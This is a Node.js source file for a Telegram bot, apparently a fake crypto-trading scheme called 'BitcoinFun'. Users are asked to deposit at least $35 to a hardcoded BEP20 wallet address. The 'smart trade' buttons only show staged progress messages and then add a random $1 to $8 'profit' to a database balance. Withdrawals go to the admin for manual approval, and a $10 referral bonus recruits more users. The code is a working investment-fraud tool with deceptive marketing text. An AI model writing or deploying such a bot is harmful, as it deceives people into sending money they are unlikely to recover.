require("dotenv").config();
const { Telegraf, Markup, session } = require("telegraf");
const express = require("express");
const admin = require("firebase-admin");

/* ================= BASIC ================= */
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const app = express();
const ADMIN_ID = String(process.env.ADMIN_ID);

// Hardcoded BEP20 address (as requested)
const BEP20_ADDRESS = "0x2784B4515D98C2a3Dbf59ebAAd741E708B6024ba";

/* ================= FIREBASE ================= */
admin.initializeApp({
  credential: admin.credential.cert(
    JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)
  ),
});
const db = admin.firestore();
const users = db.collection("users");

/* ================= MIDDLEWARE ================= */
bot.use(session());

/* ================= HELPERS ================= */
const userRef = (id) => users.doc(String(id));

async function loadUser(ctx) {
  if (ctx.session.user) return ctx.session.user;

  const uid = String(ctx.from.id);
  const ref = userRef(uid);
  const snap = await ref.get();

  if (!snap.exists) {
    const data = {
      balance: 0,
      deposited: 0,
      referrals: 0,
      lastTrade: 0,
      tradesToday: 0,
      lastTradeDay: new Date().toDateString(),
      username: ctx.from.username || "",
    };
    await ref.set(data);
    ctx.session.user = data;
    return data;
  }

  const data = snap.data();
  const today = new Date().toDateString();

  if (data.lastTradeDay !== today) {
    data.tradesToday = 0;
    data.lastTradeDay = today;
    await ref.update({
      tradesToday: 0,
      lastTradeDay: today,
    });
  }

  ctx.session.user = data;
  return data;
}

/* ================= START ================= */
bot.start(async (ctx) => {
  const uid = String(ctx.from.id);
  const refId = ctx.startPayload;
  const user = await loadUser(ctx);

  // Referral bonus
  if (refId && refId !== uid) {
    const rRef = userRef(refId);
    const rSnap = await rRef.get();
    if (rSnap.exists) {
      await rRef.update({
        balance: admin.firestore.FieldValue.increment(10),
        referrals: admin.firestore.FieldValue.increment(1),
      });
      await bot.telegram.sendMessage(
        refId,
        "Referral bonus unlocked. +$10 added to your balance."
      );
    }
  }

  return ctx.reply(
    "BitcoinFun Smart Liquidity Engine\n\n" +
      "Institutional-style liquidity simulation\n" +
      "Smart probability execution\n" +
      "Fast. Secure. Exclusive.\n\n" +
      "Minimum capital required: $35\n" +
      "Trades allowed: 2 per day\n\n" +
      "Tap a button below to enter the system.",
    Markup.inlineKeyboard([
      [Markup.button.callback("ADD CAPITAL ($35+)", "deposit")],
      [Markup.button.callback("SMART TRADE (UP / DOWN)", "trade_menu")],
      [Markup.button.callback("WITHDRAW PROFITS", "withdraw")],
      [Markup.button.callback("LIVE SUPPORT", "support")],
      [Markup.button.callback("REFER & EARN $10", "refer")],
    ])
  );
});

/* ================= DEPOSIT ================= */
bot.action("deposit", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.mode = "deposit_amount";

  return ctx.reply(
    "Capital Injection Panel\n\n" +
      "Send funds to the BEP20 address below:\n\n" +
      BEP20_ADDRESS +
      "\n\nMinimum deposit: $35\n\n" +
      "Enter the amount you have sent."
  );
});

/* ================= TRADE MENU ================= */
bot.action("trade_menu", async (ctx) => {
  await ctx.answerCbQuery();
  return ctx.reply(
    "Smart Trade Panel\n\nChoose market direction:",
    Markup.inlineKeyboard([
      [
        Markup.button.callback("UP (BULLISH)", "trade_up"),
        Markup.button.callback("DOWN (BEARISH)", "trade_down"),
      ],
    ])
  );
});

/* ================= TRADE EXECUTION ================= */
bot.action(["trade_up", "trade_down"], async (ctx) => {
  await ctx.answerCbQuery();
  const user = await loadUser(ctx);
  const uid = String(ctx.from.id);

  if (user.deposited < 35) {
    return ctx.reply(
      "Trading is locked.\nActivate your account with a $35 deposit."
    );
  }

  const now = Date.now();
  if (user.tradesToday >= 2 && now - user.lastTrade < 12 * 60 * 60 * 1000) {
    return ctx.reply("Cooldown active. Please come back later.");
  }

  user.tradesToday += 1;
  user.lastTrade = now;

  await userRef(uid).update({
    tradesToday: user.tradesToday,
    lastTrade: now,
  });

  await ctx.reply("Routing liquidity...");
  setTimeout(() => {
    ctx.reply("Executing smart probability engine...");
  }, 2000);

  setTimeout(async () => {
    const win = Math.floor(Math.random() * 8) + 1;
    user.balance += win;
    await userRef(uid).update({ balance: user.balance });

    ctx.reply(
      "Trade completed successfully.\nProfit credited: $" +
        win +
        "\n\nNext cycle available after cooldown."
    );
  }, 5000);
});

/* ================= WITHDRAW ================= */
bot.action("withdraw", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.mode = "withdraw_amount";
  return ctx.reply(
    "Withdrawal Panel\n\n" +
      "Rules:\n" +
      "- Minimum withdrawal: $30\n" +
      "- Amount cannot exceed deposited capital\n\n" +
      "Enter withdrawal amount."
  );
});

/* ================= SUPPORT ================= */
bot.action("support", async (ctx) => {
  await ctx.answerCbQuery();
  ctx.session.mode = "support";
  return ctx.reply(
    "Live Support\n\nType your message below.\nAdmin will review it personally."
  );
});

/* ================= REFERRAL ================= */
bot.action("refer", async (ctx) => {
  await ctx.answerCbQuery();
  const me = await bot.telegram.getMe();
  const link = "https://t.me/" + me.username + "?start=" + ctx.from.id;

  return ctx.reply(
    "Referral Program\n\n" +
      "Invite friends and earn $10 per referral.\n\n" +
      link
  );
});

/* ================= TEXT HANDLER ================= */
bot.on("text", async (ctx) => {
  const user = await loadUser(ctx);
  const uid = String(ctx.from.id);

  // Support message
  if (ctx.session.mode === "support") {
    ctx.session.mode = null;
    await bot.telegram.sendMessage(
      ADMIN_ID,
      "SUPPORT MESSAGE\nUser: " + uid + "\n\n" + ctx.message.text
    );
    return ctx.reply("Your message has been sent to support.");
  }

  // Deposit amount
  if (ctx.session.mode === "deposit_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 35) {
      return ctx.reply("Invalid amount. Minimum deposit is $35.");
    }
    ctx.session.depositAmt = amt;
    ctx.session.mode = "deposit_proof";
    return ctx.reply("Upload payment screenshot now.");
  }

  // Withdraw amount
  if (ctx.session.mode === "withdraw_amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 30 || amt > user.deposited) {
      return ctx.reply("Invalid withdrawal amount.");
    }
    ctx.session.withdrawAmt = amt;
    ctx.session.mode = "withdraw_address";
    return ctx.reply("Send your BEP20 wallet address.");
  }

  // Withdraw address
  if (ctx.session.mode === "withdraw_address") {
    ctx.session.mode = null;
    await bot.telegram.sendMessage(
      ADMIN_ID,
      "WITHDRAW REQUEST\nUser: " +
        uid +
        "\nAmount: $" +
        ctx.session.withdrawAmt +
        "\nAddress: " +
        ctx.message.text
    );
    return ctx.reply("Withdrawal request sent for approval.");
  }
});

/* ================= DEPOSIT PROOF ================= */
bot.on(["photo", "document"], async (ctx) => {
  if (ctx.session.mode !== "deposit_proof") return;
  ctx.session.mode = null;

  const fileId = ctx.message.photo
    ? ctx.message.photo[ctx.message.photo.length - 1].file_id
    : ctx.message.document.file_id;

  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
    caption:
      "DEPOSIT PROOF\nUser: " +
      ctx.from.id +
      "\nAmount: $" +
      ctx.session.depositAmt,
  });

  ctx.reply("Deposit proof sent. Awaiting admin verification.");
});

/* ================= SERVER ================= */
app.get("/", function (req, res) {
  res.send("BitcoinFun Bot LIVE");
});

app.listen(process.env.PORT || 3000, "0.0.0.0");

/* ================= LAUNCH ================= */
bot.launch().then(function () {
  console.log("BitcoinFun bot started successfully");
});